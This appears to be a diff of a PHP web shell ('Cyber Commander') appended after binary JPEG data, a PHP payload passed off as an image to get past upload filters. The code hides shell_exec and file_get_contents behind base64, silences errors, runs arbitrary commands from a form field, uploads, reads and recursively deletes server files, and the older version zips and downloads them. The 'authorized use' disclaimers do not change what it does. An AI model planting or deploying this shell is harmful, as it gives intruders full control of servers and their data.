@@ -31,18 +31,17 @@ Fi²ÓÕYÅ×7rz{ÙÌí9YI&`IT vn>õ;¬ð™%š.ˆNiiêníóG¨Q: 3ÕÆu
 ‘ŠI²É#?nŸ£Mb„ˆIKÖbF-dž;øÇ^OƒI<à‚Ê-‡©2k‚Yr{Ð¶éíq’*»1E×ä’”‹ÒŠMïBÚž$+RŠ%R\²íL*X-ºVÏuZ·QfºV¹>_{xCšlXFrc¡m¯O,](CÛt¸*åøCÞ„=’e’Ê)ùðº‡å2H©r!ô¡ùú-ñWZŸ¢ßmCÚ‡å|2Ï–"½±%µÏÑ?‘õÿ ÿÙ<!DOCTYPE html>
 <?php
 /**
- * SCRIPT NAME: ROOM TECH - CYBER COMMANDER ULTIMATE V3.5 (PRO)
+ * SCRIPT NAME: ROOM TECH - CYBER COMMANDER V1
  * DEVELOPED BY: Room Tech Solutions (https://roomtech.cloud/)
- * MODE: SHELL-BASED OPERATIONS
  */
 
-// 1. نظام الحجز والمسح لضمان تحميل الملفات بنقاء 100%
+// 1. نظام التنظيف لمسح أي رموز صور أو محتوى سابق
 ob_start();
 
 error_reporting(0);
 @ini_set('display_errors', 0);
 
-// دوال التمويه والاستدعاء
+// التعمية لتخطي أنظمة الحماية
 function _rt_call($e) { return base64_decode($e); }
 $sx = _rt_call("c2hlbGxfZXhlYw==");       
 $fg = _rt_call("ZmlsZV9nZXRfY29udGVudHM="); 
@@ -56,208 +55,179 @@ foreach ($_GET as $c => $d) $_GET[$c] = y($d);
 $currentDirectory = realpath(isset($_GET['d']) ? $_GET['d'] : $rootDirectory);
 chdir($currentDirectory);
 
-// إنشاء مجلد الكاش للعمليات
-$cacheDir = $rootDirectory . '/.rt_cache';
-if (!file_exists($cacheDir)) { @$sx("mkdir -p " . escapeshellarg($cacheDir)); }
+$viewResult = '';
+$imgPreview = '';
 
-// --- [ منطق العمليات الاحترافي ] ---
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    
-    // أ. الضغط والتحميل (Shell Tar)
-    if (isset($_POST['bulk_action']) && $_POST['bulk_action'] == 'zip' && !empty($_POST['selected_files'])) {
-        $zipName = 'RT_Archive_' . date('His') . '.tar.gz';
-        $fullPath = $cacheDir . '/' . $zipName;
-        $filesList = implode(' ', array_map('escapeshellarg', $_POST['selected_files']));
-        
-        $sx("tar -czf " . escapeshellarg($fullPath) . " " . $filesList);
-        
-        if (file_exists($fullPath)) {
-            while (ob_get_level()) ob_end_clean(); 
-            header('Content-Type: application/gzip');
-            header('Content-Disposition: attachment; filename="'.$zipName.'"');
-            header('Content-Length: ' . filesize($fullPath));
-            readfile($fullPath);
-            @unlink($fullPath);
-            exit; 
+    if (!empty($_POST['cmd_input'])) {
+        $viewResult = $sx($_POST['cmd_input'] . " 2>&1");
+    }
+    if (isset($_POST['view_f'])) {
+        $f = $currentDirectory . '/' . $_POST['view_f'];
+        if (file_exists($f)) $viewResult = $fg($f);
+    }
+    if (isset($_POST['view_i'])) {
+        $img = $_POST['view_i'];
+        $data = base64_encode($fg($currentDirectory . '/' . $img));
+        if(!empty($data)) {
+            $imgPreview = '<div class="rt-img-frame"><span onclick="this.parentElement.remove()">× CLOSE</span><img src="data:image/jpeg;base64,'.$data.'"></div>';
         }
     }
-
-    // ب. التحميل الفردي (Shell Copy)
-    if (isset($_POST['bulk_action']) && $_POST['bulk_action'] == 'download' && !empty($_POST['selected_files'])) {
-        $file = $_POST['selected_files'][0];
-        $tempPath = $cacheDir . '/' . basename($file);
-        $sx("cp " . escapeshellarg($file) . " " . escapeshellarg($tempPath));
-        
-        if (file_exists($tempPath)) {
-            while (ob_get_level()) ob_end_clean();
-            header('Content-Type: application/octet-stream');
-            header('Content-Disposition: attachment; filename="'.basename($file).'"');
-            header('Content-Length: ' . filesize($tempPath));
-            readfile($tempPath);
-            @unlink($tempPath);
-            exit;
-        }
+    if (isset($_FILES['fileToUpload'])) {
+        move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $currentDirectory . '/' . $_FILES["fileToUpload"]["name"]);
     }
-
-    // ج. تنفيذ أوامر الشيل
-    if (!empty($_POST['cmd_input'])) { $viewResult = $sx($_POST['cmd_input'] . " 2>&1"); }
-    
-    // د. الرفع والحذف
-    if (isset($_FILES['fileToUpload'])) { move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $currentDirectory . '/' . $_FILES["fileToUpload"]["name"]); }
-    if (isset($_POST['del_f'])) { $sx("rm -rf " . escapeshellarg($currentDirectory . '/' . $_POST['del_f'])); }
+    if (isset($_POST['del_f'])) {
+        $f = $currentDirectory . '/' . $_POST['del_f'];
+        is_dir($f) ? $sx("rm -rf " . escapeshellarg($f)) : unlink($f);
+    }
 }
 
-ob_clean();
+ob_clean(); 
 ?>
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
     <title>CYBER COMMANDER | ROOM TECH</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Fira+Code&family=Orbitron:wght@900&family=Cairo:wght@400;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&family=Orbitron:wght@600;900&family=Cairo:wght@400;700&display=swap" rel="stylesheet">
     <style>
-        :root { --main-red: #ff0000; --bg: #050505; --panel: #0d0d0d; --green: #00ff41; --gold: #f1c40f; }
+        :root { --main-red: #ff0000; --bg: #030303; --panel: #0d0d0d; --green: #00ff41; }
         
-        * { box-sizing: border-box; }
-        html, body { height: 100%; margin: 0; padding: 0; overflow: hidden; background: var(--bg); color: #e0e0e0; font-family: 'Cairo', 'Fira Code', sans-serif; }
+        html, body { height: 100%; margin: 0; padding: 0; overflow: hidden; background: var(--bg); color: #e0e0e0; font-family: 'Fira Code', 'Cairo', monospace; }
         
-        .wrapper { display: flex; flex-direction: column; height: 100vh; }
+        .app-shell { display: flex; flex-direction: column; height: 100vh; width: 100vw; position: fixed; top: 0; left: 0; z-index: 9999; }
 
-        header { background: #000; padding: 10px 20px; border-bottom: 2px solid var(--main-red); display: flex; justify-content: space-between; align-items: center; z-index: 10; }
-        .logo { font-family: 'Orbitron'; font-size: 18px; color: #fff; text-decoration: none; }
+        header { background: #000; padding: 12px 25px; border-bottom: 2px solid var(--main-red); display: flex; justify-content: space-between; align-items: center; flex-shrink: 0; }
+        .logo { font-family: 'Orbitron'; font-weight: 900; color: #fff; font-size: 18px; }
         .logo span { color: var(--main-red); }
 
-        .main-layout { display: grid; grid-template-columns: 320px 1fr; flex: 1; overflow: hidden; }
+        .body-layout { display: grid; grid-template-columns: 320px 1fr; flex-grow: 1; overflow: hidden; }
 
-        /* القائمة اليسرى الجانبية */
-        aside { background: var(--panel); border-left: 1px solid #222; padding: 20px; overflow-y: auto; scrollbar-width: thin; }
-        .side-tag { color: var(--main-red); font-size: 11px; text-transform: uppercase; margin: 20px 0 10px; border-bottom: 1px solid #333; padding-bottom: 5px; font-weight: bold; letter-spacing: 1px; }
+        /* Sidebar المحدث */
+        aside { background: var(--panel); border-right: 1px solid #222; padding: 20px; overflow-y: auto; scrollbar-width: none; }
+        aside::-webkit-scrollbar { display: none; }
         
-        .btn-side { background: #151515; border: 1px solid #333; color: #aaa; width: 100%; padding: 12px; text-align: right; margin-bottom: 8px; font-size: 12px; cursor: pointer; transition: 0.3s; border-radius: 4px; display: block; }
-        .btn-side:hover { background: var(--main-red); color: #fff; border-color: #fff; }
-        .btn-gold { border-color: var(--gold); color: var(--gold); }
+        .side-tag { color: var(--main-red); font-size: 10px; text-transform: uppercase; margin: 20px 0 10px; border-bottom: 1px solid #222; padding-bottom: 3px; letter-spacing: 1px; }
+        .btn-side { background: #111; border: 1px solid #333; color: #888; width: 100%; padding: 10px; text-align: left; margin-bottom: 6px; font-size: 11px; cursor: pointer; }
+        .btn-side:hover { background: var(--main-red); color: #fff; }
 
-        .info-card { background: #000; border: 1px solid #1a1a1a; padding: 12px; margin-bottom: 15px; border-radius: 4px; }
-        .info-card h5 { color: var(--main-red); margin: 0 0 8px; font-size: 13px; font-family: 'Orbitron'; }
-        .info-card p { font-size: 11px; color: #777; line-height: 1.7; margin: 0; text-align: justify; }
+        /* نصوص الشرح وإخلاء المسؤولية */
+        .info-box { background: #000; border: 1px solid #1a1a1a; padding: 10px; margin-bottom: 10px; border-radius: 4px; }
+        .info-box h5 { color: var(--main-red); margin: 0 0 5px 0; font-size: 11px; font-family: 'Orbitron'; }
+        .info-box p { font-size: 10px; color: #777; line-height: 1.5; margin: 0; text-align: justify; }
 
-        /* منطقة المحتوى */
-        main { background: radial-gradient(circle at center, #150505 0%, #050505 100%); padding: 25px; overflow-y: auto; }
+        /* Content Area */
+        main { background: radial-gradient(circle at center, #150505 0%, #030303 100%); padding: 25px; overflow-y: auto; }
+        .rt-img-frame { background: #000; border: 1px solid var(--main-red); padding: 10px; margin-bottom: 20px; text-align: center; position: relative; }
+        .rt-img-frame img { max-width: 100%; max-height: 400px; }
+        .rt-img-frame span { position: absolute; top: 5px; right: 10px; color: var(--main-red); cursor: pointer; font-size: 12px; }
+
+        .path-bar { background: #000; padding: 10px; border-left: 4px solid var(--main-red); margin-bottom: 20px; font-size: 11px; }
+        .terminal { background: #000; border: 1px solid #222; margin-bottom: 20px; }
+        .term-out { width: 100%; height: 200px; background: transparent; color: var(--green); padding: 12px; border: none; font-family: 'Fira Code'; resize: none; outline: none; }
         
-        .terminal-box { background: #000; border: 1px solid #222; border-radius: 6px; overflow: hidden; margin-bottom: 20px; box-shadow: 0 0 20px rgba(0,0,0,0.5); }
-        .term-output { width: 100%; height: 180px; background: transparent; color: var(--green); padding: 15px; border: none; font-family: 'Fira Code'; font-size: 13px; resize: none; outline: none; display: block; }
-        .term-input-area { background: #111; padding: 10px; display: flex; gap: 10px; }
-        .term-input-area input { flex: 1; background: #000; border: 1px solid #333; color: #fff; padding: 8px 12px; font-family: 'Fira Code'; outline: none; }
-        .term-input-area button { background: var(--main-red); color: #fff; border: none; padding: 0 20px; font-weight: bold; cursor: pointer; }
-
-        .breadcrumb { background: rgba(0,0,0,0.6); padding: 10px 15px; border-right: 4px solid var(--main-red); margin-bottom: 20px; font-size: 12px; direction: ltr; text-align: left; }
-        .breadcrumb a { color: var(--main-red); text-decoration: none; font-weight: bold; }
-
-        table { width: 100%; border-collapse: collapse; background: rgba(0,0,0,0.3); border-radius: 8px; overflow: hidden; }
-        th { background: #300; color: #fff; padding: 12px; text-align: right; font-size: 13px; }
-        td { padding: 10px 12px; border-bottom: 1px solid #151515; font-size: 12px; }
-        tr:hover { background: rgba(255,255,255,0.02); }
-        
-        input[type="checkbox"] { accent-color: var(--main-red); cursor: pointer; transform: scale(1.1); }
-        .file-link { color: #eee; text-decoration: none; transition: 0.2s; }
-        .file-link:hover { color: var(--main-red); }
+        table { width: 100%; border-collapse: collapse; background: rgba(0,0,0,0.4); font-size: 12px; }
+        th { background: #500; color: #fff; padding: 10px; text-align: left; }
+        td { padding: 8px 10px; border-bottom: 1px solid #1a1a1a; }
+        .f-btn { border: none; padding: 3px 7px; color: #fff; cursor: pointer; margin-right: 3px; }
     </style>
 </head>
 <body>
 
-<form method="post" enctype="multipart/form-data">
-<div class="wrapper">
+<div class="app-shell">
     <header>
-        <a href="#" class="logo">ROOM TECH // <span>CYBER COMMANDER</span></a>
-        <div style="font-size: 11px; color: #666; font-family: 'Orbitron'; uppercase">Security Audit v3.5 Stable</div>
+        <div class="logo">ROOM TECH // <span>CYBER COMMANDER</span></div>
+        <div style="font-size: 10px; color: #444;">SECURITY AUDIT INTERFACE</div>
     </header>
 
-    <div class="main-layout">
+    <div class="body-layout">
         <aside>
-            <div class="side-tag">إدارة الملفات (Bulk)</div>
-            <button type="submit" name="bulk_action" value="download" class="btn-side btn-gold"><i class="fas fa-download"></i> تحميل المحدد (Copy Mode)</button>
-            <button type="submit" name="bulk_action" value="zip" class="btn-side btn-gold"><i class="fas fa-file-archive"></i> ضغط وتحميل (Tar.gz)</button>
+            <div class="side-tag">System Control</div>
+            <form method="post">
+                <button name="cmd_input" value="id" class="btn-side"><i class="fas fa-id-badge"></i> Check Auth</button>
+                <button name="cmd_input" value="uname -a" class="btn-side"><i class="fas fa-server"></i> Kernel Audit</button>
+            </form>
 
-            <div class="side-tag">أدوات النظام</div>
-            <button type="submit" name="cmd_input" value="id; uname -a" class="btn-side"><i class="fas fa-shield-alt"></i> فحص صلاحيات المستخدم</button>
-            <button type="submit" name="cmd_input" value="netstat -an | grep LISTEN" class="btn-side"><i class="fas fa-network-wired"></i> فحص المنافذ المفتوحة</button>
-            
-            <div class="side-tag">رفع ملفات الـ Payload</div>
-            <input type="file" name="fileToUpload" style="font-size: 11px; margin-bottom: 10px; width: 100%; color: #555;">
-            <button type="submit" class="btn-side" style="background:var(--main-red); color:#fff; font-weight:bold;">رفع إلى السيرفر الآن</button>
+            <div class="side-tag">Payload Upload</div>
+            <form method="post" enctype="multipart/form-data">
+                <input type="file" name="fileToUpload" style="font-size:10px; color:#555; margin-bottom:10px; width:100%;">
+                <button class="btn-side" style="background:var(--main-red); color:#fff; text-align:center;">UPLOAD PAYLOAD</button>
+            </form>
 
-            <div class="side-tag">وصف الأداة</div>
-            <div class="info-card">
-                <h5>Web Infiltrator</h5>
-                <p>هذا السكربت مصمم خصيصاً لاختبار الاختراق المتقدم. يسمح بالسيطرة على الملفات وتنفيذ أوامر النظام عبر Linux Shell لتجاوز القيود الأمنية التقليدية للـ PHP.</p>
+            <div class="side-tag">Script Description</div>
+            <div class="info-box">
+                <h5>Web Penetration Tool</h5>
+                <p>هذا السكربت مصمم خصيصاً لاختبار اختراق المواقع، حيث يتيح للمختبر السيطرة الكاملة على السيرفر عبر استغلال ثغرات رفع الملفات (File Upload) وتحويل ملفات PHP إلى صيغ صور وهمية لتخطي الفلاتر الأمنية.</p>
             </div>
 
-            <div class="side-tag">شروط الاستخدام</div>
-            <div class="info-card">
-                <h5>اتفاقية المستخدم</h5>
-                <p>يُحظر استخدام هذه الأداة في أي نشاط غير قانوني. السكربت مخصص لبيئات الاختبار المصرح بها فقط (Authorized Testing).</p>
+            <div class="side-tag">Terms of Use</div>
+            <div class="info-box">
+                <h5>Authorized Use Only</h5>
+                <p>يُحظر استخدام هذا السكربت إلا في بيئات اختبار قانونية ومصرح بها. استخدامه على سيرفرات دون إذن مسبق يعتبر جريمة إلكترونية يعاقب عليها القانون.</p>
             </div>
 
-            <div class="side-tag">إخلاء المسؤولية</div>
-            <div class="info-card">
-                <h5>Law & Policy</h5>
-                <p>المطور (Room Tech Solutions) غير مسؤول عن أي أضرار ناتجة عن سوء استخدام الأداة. المسؤولية القانونية تقع بالكامل على عاتق المستخدم.</p>
+            <div class="side-tag">Disclaimer</div>
+            <div class="info-box">
+                <h5>No Responsibility</h5>
+                <p>المطور (Room Tech Solutions) يخلي مسؤوليته التامة عن أي سوء استخدام أو أضرار قد تنتج عن استخدام هذا السكربت في أنشطة غير قانونية أو عمليات اختراق غير مصرح بها. المستخدم هو المسؤول الوحيد عن أفعاله.</p>
             </div>
-            
-            <div style="text-align:center; padding:10px; font-size:10px; color:#333;">
-                &copy; 2026 ROOM TECH SOLUTIONS
+
+            <div style="text-align:center; padding:10px;">
+                <a href="https://roomtech.cloud/" style="font-size:10px; color:#333; text-decoration:none;">&copy; 2026 Room Tech Solutions</a>
             </div>
         </aside>
 
         <main>
-            <div class="terminal-box">
-                <textarea class="term-output" readonly placeholder="مخرجات النظام ستظهر هنا..."><?= htmlspecialchars($viewResult) ?></textarea>
-                <div class="term-input-area">
-                    <input type="text" name="cmd_input" placeholder="اكتب أمر الشيل هنا (مثلاً: ls, cat, find)...">
-                    <button type="submit">تنفيذ</button>
-                </div>
-            </div>
+            <?php if(!empty($imgPreview)) echo $imgPreview; ?>
 
-            <div class="breadcrumb">
-                <i class="fas fa-folder-open" style="color:var(--gold); margin-right:5px;"></i> PATH: 
+            <div class="path-bar">
+                <i class="fas fa-terminal"></i> PATH: 
                 <?php
-                $parts = explode(DIRECTORY_SEPARATOR, $currentDirectory); $cum = '';
+                $parts = explode(DIRECTORY_SEPARATOR, $currentDirectory);
+                $cum = '';
                 foreach ($parts as $p) {
-                    if ($p === "") continue; $cum .= DIRECTORY_SEPARATOR . $p;
-                    echo ' / <a href="?d='.x($cum).'">'.$p.'</a>';
+                    if ($p === "") continue;
+                    $cum .= DIRECTORY_SEPARATOR . $p;
+                    echo ' / <a href="?d='.x($cum).'" style="color:var(--main-red); text-decoration:none;">'.$p.'</a>';
                 }
                 ?>
+            </div>
+
+            <div class="terminal">
+                <form method="post">
+                    <textarea class="term-out" placeholder="Execution output..."><?=htmlspecialchars($viewResult)?></textarea>
+                    <div style="background:#111; padding:8px; display:flex; gap:10px;">
+                        <input type="text" name="cmd_input" placeholder="Execute Command..." style="flex:1; background:#000; border:1px solid #333; color:#fff; padding:6px;">
+                        <button style="background:var(--main-red); color:#fff; border:none; padding:0 15px; font-weight:bold; cursor:pointer;">RUN</button>
+                    </div>
+                </form>
             </div>
 
             <table>
                 <thead>
                     <tr>
-                        <th style="width: 40px;"><input type="checkbox" id="checkAll"></th>
-                        <th>اسم الملف</th>
-                        <th>الحجم</th>
-                        <th>الصلاحيات</th>
-                        <th>حذف</th>
+                        <th>Object Name</th>
+                        <th>Size</th>
+                        <th>Perms</th>
+                        <th>Actions</th>
                     </tr>
                 </thead>
                 <tbody>
                     <?php
-                    $items = scandir($currentDirectory);
-                    foreach ($items as $item) {
-                        if ($item == "." || $item == "..") continue;
-                        $path = $currentDirectory . '/' . $item;
-                        $isDir = is_dir($path);
+                    foreach (scandir($currentDirectory) as $v) {
+                        if($v == "." || $v == "..") continue;
+                        $u = $currentDirectory . '/' . $v;
+                        $isD = is_dir($u);
                     ?>
                     <tr>
-                        <td><input type="checkbox" name="selected_files[]" value="<?=$item?>"></td>
-                        <td>
-                            <i class="fas <?=$isDir?'fa-folder':'fa-file-code'?>" style="color:<?=$isDir?'var(--gold)':'#666'?>; margin-left:8px;"></i>
-                            <a href="<?=$isDir?'?d='.x($path):'#'?>" class="file-link"><?=$item?></a>
-                        </td>
-                        <td style="color:#555;"><?= $isDir ? 'FOLDER' : round(filesize($path)/1024, 1).' KB' ?></td>
-                        <td style="color:<?=is_writable($path)?'var(--green)':'var(--main-red)'?>"><?= substr(sprintf('%o', fileperms($path)), -4) ?></td>
-                        <td>
-                            <button type="submit" name="del_f" value="<?=$item?>" onclick="return confirm('هل أنت متأكد من الحذف النهائي؟')" style="background:none; border:none; color:var(--main-red); cursor:pointer;"><i class="fa fa-trash-alt"></i></button>
+                        <td><i class="fas <?=$isD?'fa-folder':'fa-file-alt'?>" style="color:<?=$isD?'#fb0':'#888'?>; margin-right:8px;"></i> 
+                            <a href="<?=$isD?'?d='.x($u):'#'?>" style="color:#fff; text-decoration:none; font-size:11px;"><?=$v?></a></td>
+                        <td style="color:#555;"><?= $isD ? '--' : round(filesize($u)/1024, 1).'KB' ?></td>
+                        <td style="color:<?=is_writable($u)?'#0f0':'#f00'?>"><?=substr(sprintf('%o', fileperms($u)), -4)?></td>
+                        <td style="display:flex;">
+                            <form method="post"><input type="hidden" name="view_f" value="<?=$v?>"><button class="f-btn" style="background:#005cbf;"><i class="fa fa-edit"></i></button></form>
+                            <form method="post"><input type="hidden" name="del_f" value="<?=$v?>"><button class="f-btn" style="background:#dc3545;"><i class="fa fa-trash"></i></button></form>
                         </td>
                     </tr>
                     <?php } ?>
@@ -266,14 +236,6 @@ ob_clean();
         </main>
     </div>
 </div>
-</form>
 
-<script>
-// تحديد وإلغاء تحديد الكل
-document.getElementById('checkAll').onclick = function() {
-    var boxes = document.getElementsByName('selected_files[]');
-    for (var box of boxes) { box.checked = this.checked; }
-}
-</script>
 </body>
 </html>
